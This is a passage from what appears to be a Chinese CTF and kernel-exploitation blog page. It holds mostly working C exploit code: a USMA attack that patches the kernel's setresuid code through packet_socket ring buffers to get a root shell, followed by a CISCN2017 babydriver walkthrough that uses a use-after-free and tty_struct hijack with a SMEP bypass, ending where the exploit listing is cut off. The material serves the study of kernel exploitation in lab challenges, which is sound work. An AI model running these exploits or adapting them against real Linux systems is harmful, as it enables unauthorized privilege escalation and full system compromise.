addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(BROWN <span class="string">&quot;[*] %s:\n&quot;</span> NONE, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_RX_RING 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_rx_ring_init</span><span class="params">(<span class="type">int</span> s, <span class="type">unsigned</span> <span class="type">int</span> block_size,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> frame_size, <span class="type">unsigned</span> <span class="type">int</span> block_nr,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">unsigned</span> <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">    <span class="type">int</span> v = TPACKET_V3;</span><br><span class="line">    <span class="type">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[X] setsockopt(PACKET_VERSION)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = block_size;</span><br><span class="line">    req.tp_frame_size = frame_size;</span><br><span class="line">    req.tp_block_nr = block_nr;</span><br><span class="line">    req.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">    req.tp_retire_blk_tov = timeout;</span><br><span class="line">    req.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">    req.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;setsockopt(PACKET_RX_RING)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_socket_setup</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> block_size, <span class="type">unsigned</span> <span class="type">int</span> frame_size,</span></span><br><span class="line"><span class="params">                        <span class="type">unsigned</span> <span class="type">int</span> block_nr, <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">    <span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">    <span class="keyword">if</span> (s &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;socket(AF_PACKET)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,</span><br><span class="line">                               sizeof_priv, timeout);</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    sa.sll_family = PF_PACKET;</span><br><span class="line">    sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">    sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">    sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">    sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">    sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> rv = bind(s, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;bind(AF_PACKET)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_pgv</span><span class="params">(<span class="type">int</span> count, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> packet_socket_setup(size, <span class="number">2048</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unshare_setup</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] setgroups deny\n&quot;</span>);</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] uid_map %s\n&quot;</span>, edit);</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gid_map %s\n&quot;</span>, edit);</span><br><span class="line">    close(tmp_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">USMA</span><span class="params">()</span></span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">        unshare_setup();</span><br><span class="line">        <span class="type">int</span> bof_fd = open(<span class="string">&quot;/dev/bof&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (bof_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open bof.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p</span> =</span> &#123;<span class="number">0x200</span>, <span class="built_in">malloc</span>(<span class="number">0x200</span>), <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(p.buf, <span class="number">0</span>, <span class="number">0x200</span>);</span><br><span class="line">        alloc_buf(bof_fd, &amp;p);</span><br><span class="line">        write_buf(bof_fd, &amp;p);</span><br><span class="line">        free_buf(bof_fd, &amp;p);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> packet_fd;</span><br><span class="line">        packet_fd = alloc_pgv(<span class="number">0x200</span>/<span class="number">8</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">        read_buf(bof_fd, &amp;p);</span><br><span class="line">        qword_dump(<span class="string">&quot;leak 1&quot;</span>, p.buf, <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>/<span class="number">8</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            p.buf[i] = SyS_setresuid_page_base;</span><br><span class="line">        &#125;</span><br><span class="line">        write_buf(bof_fd, &amp;p);</span><br><span class="line">        read_buf(bof_fd, &amp;p);</span><br><span class="line">        qword_dump(<span class="string">&quot;leak 2&quot;</span>, p.buf, <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *page = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span> * (<span class="number">0x200</span> / <span class="number">8</span>), PROT_READ | PROT_WRITE, MAP_SHARED, packet_fd, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page == MAP_FAILED) &#123;</span><br><span class="line">            perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        qword_dump(<span class="string">&quot;page&quot;</span>, (page+SyS_setresuid_page_offset),  (<span class="number">0x8</span>));</span><br><span class="line">        <span class="comment">// b.ne #98h C1 04 00 54 -&gt; b #98h 26 00 00 14; 注意大小端序</span></span><br><span class="line">        page[SyS_setresuid_page_offset + <span class="number">0</span>] = <span class="number">0x26</span>;</span><br><span class="line">        page[SyS_setresuid_page_offset + <span class="number">1</span>] = <span class="number">0x00</span>;</span><br><span class="line">        page[SyS_setresuid_page_offset + <span class="number">2</span>] = <span class="number">0x00</span>;</span><br><span class="line">        page[SyS_setresuid_page_offset + <span class="number">3</span>] = <span class="number">0x14</span>;</span><br><span class="line">        qword_dump(<span class="string">&quot;page&quot;</span>, (page+SyS_setresuid_page_offset),  (<span class="number">0x8</span>));</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], <span class="string">&quot;E&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        pause();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">1</span>];</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], buf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] start get root\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;setresuid&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(GREEN <span class="string">&quot;[+] Get root successfully!&quot;</span> NONE <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] fork() error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    USMA();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="KSMA"><a href="#KSMA" class="headerlink" title="KSMA"></a>KSMA</h2><h3 id="利用思路-18"><a href="#利用思路-18" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-18"><a href="#exp-18" class="headerlink" title="exp"></a>exp</h3><h2 id="Ret2hbp"><a href="#Ret2hbp" class="headerlink" title="Ret2hbp"></a>Ret2hbp</h2><h3 id="利用思路-19"><a href="#利用思路-19" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-19"><a href="#exp-19" class="headerlink" title="exp"></a>exp</h3><h2 id="Use-After-Cleanup"><a href="#Use-After-Cleanup" class="headerlink" title="Use After Cleanup"></a>Use After Cleanup</h2><h3 id="利用思路-20"><a href="#利用思路-20" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-20"><a href="#exp-20" class="headerlink" title="exp"></a>exp</h3><h2 id="Ret2VDSO"><a href="#Ret2VDSO" class="headerlink" title="Ret2VDSO"></a>Ret2VDSO</h2><h3 id="利用思路-21"><a href="#利用思路-21" class="headerlink" title="利用思路"></a>利用思路</h3><p>VDSO是内核映射到用户空间的代码，利用内核的<code>set_memory_rw</code>设置<code>vdso</code>为可写权限，然后向<code>vdso</code>写入<code>shellcode</code>即可。可以用来绕过<code>PAN/PXN</code>保护。</p>
<h3 id="exp-21"><a href="#exp-21" class="headerlink" title="exp"></a>exp</h3><h2 id="Kernel-Unlink"><a href="#Kernel-Unlink" class="headerlink" title="Kernel Unlink"></a>Kernel Unlink</h2><h3 id="利用思路-22"><a href="#利用思路-22" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-22"><a href="#exp-22" class="headerlink" title="exp"></a>exp</h3><h2 id="CISCN2017-babydriver"><a href="#CISCN2017-babydriver" class="headerlink" title="CISCN2017 babydriver"></a>CISCN2017 babydriver</h2><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>开了 <code>smep</code> 保护，没有 <code>kaslr</code>。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-initrd rootfs.img \</span><br><span class="line">	-kernel bzImage \</span><br><span class="line">	-append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 quiet nokaslr&#x27;</span>\</span><br><span class="line">	-enable-kvm \</span><br><span class="line">	-monitor /dev/null \</span><br><span class="line">	-m 64M \</span><br><span class="line">	--nographic \</span><br><span class="line">	-smp cores=1,threads=1 \</span><br><span class="line">	-cpu kvm64,+smep \</span><br><span class="line">	-s</span><br></pre></td></tr></table></figure></div>

<p>模块中存在一个<code>babydevice_t</code>结构体：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">babydevice_t</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *device_buf;</span><br><span class="line">    <span class="type">size_t</span> device_buf_len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>babyioctl</strong></p>
<p>将原先的 <code>device_buf</code> 释放，并分配一块新的内存。但这里有个很重要的点需要注意：该位置的 <code>kmalloc</code> 大小可以被用户任意指定。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;\x013defalut:arg is %ld\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>babyopen</strong></p>
<p>申请的初始<code>buf</code>长度为<code>0x40</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>babywrite</strong></p>
<p><code>ida</code> 反汇编存在错误，这里需要修改一下<code>copy_from_user</code>的<code>call type</code>为<code>void (__fastcall *)(char *, char *, size_t)</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *, <span class="type">char</span> *, <span class="type">size_t</span>))copy_from_user)(babydev_struct.device_buf, (<span class="type">char</span> *)buffer, v4);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>babyread</strong></p>
<p>修改一下<code>copy_to_user</code>的函数调用类型为<code>void (__fastcall *)(char *, char *, size_t)</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *, <span class="type">char</span> *, <span class="type">size_t</span>))copy_to_user)(buffer, babydev_struct.device_buf, v4);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>babyrelease</strong></p>
<p>没有重置<code>len</code>，也没有清空<code>buf</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="利用思路-23"><a href="#利用思路-23" class="headerlink" title="利用思路"></a>利用思路</h3><p>执行完 <code>babyrelease</code> 函数之后，<code>device_buf</code>就会成为悬垂指针。但需要注意的是，在用户进程空间中，当执行<code>close(fd)</code>之后，该进程将无法再使用这个文件描述符，因此没有办法在<code>close</code>后再利用这个 <code>fd</code> 去进行写操作。</p>
<p>但我们可以利用 <code>babydriver</code> 中的变量全是全局变量的这个特性，同时执行两次 <code>open</code> 操作，获取两个 fd。这样即便一个 fd 被 close 了，我们仍然可以利用另一个 fd 来对 <code>device_buf</code> 进行写操作。</p>
<p>这道题虽然可以利用<code>UAF</code>提权，但这里我们主要练习一下<code>tty_struct</code>劫持，这道题的劫持相对来说是很简单的。</p>
<ol>
<li>利用 <code>UAF</code> 劫持 <code>tty_struct</code> 的 <code>ops</code> 执行伪造的 <code>fake_ops</code>。</li>
<li>利用 <code>fake_ops-&gt;ioctl</code> 结合 <code>cr4</code> 寄存器关闭 <code>smep</code>，并完成栈迁移。</li>
<li>执行用户空间的提权代码。</li>
</ol>
<p>这里需要注意的是：</p>
<ul>
<li><code>mmap</code> 的内存不应该从 <code>rax &amp; 0xffffffff</code> 开始，因为在执行 <code>rop</code> 时返回到用户空间执行 <code>get_root</code> 函数会抬高 <code>rsp</code> 小于 <code>rax &amp; 0xffffffff</code> 造成越界，因此需要加一个偏移。</li>
</ul>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* fake_stack = mmap(</span><br><span class="line">            (hijacked_stack_addr &amp; (~<span class="number">0xffff</span>))<span class="number">-0x1000</span>, <span class="comment">// 对齐。</span></span><br><span class="line">            <span class="number">0x30000</span>,</span><br><span class="line">            PROT_READ | PROT_WRITE,                    </span><br><span class="line">            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,</span><br><span class="line">            <span class="number">-1</span>,</span><br><span class="line">            <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>mmap</code> 的内存是没有映射到实际物理内存的虚拟内存，如果 <code>rsp</code> 到达没有写入 <code>rop</code> 的位置同样也会导致越界错误，因此在使用前先写入数据使其映射到物理内存上。</li>
</ul>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(fake_stack, <span class="number">0</span>, <span class="number">0x30000</span>);</span><br></pre></td></tr></table></figure></div>
<h3 id="exp-23"><a href="#exp-23" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 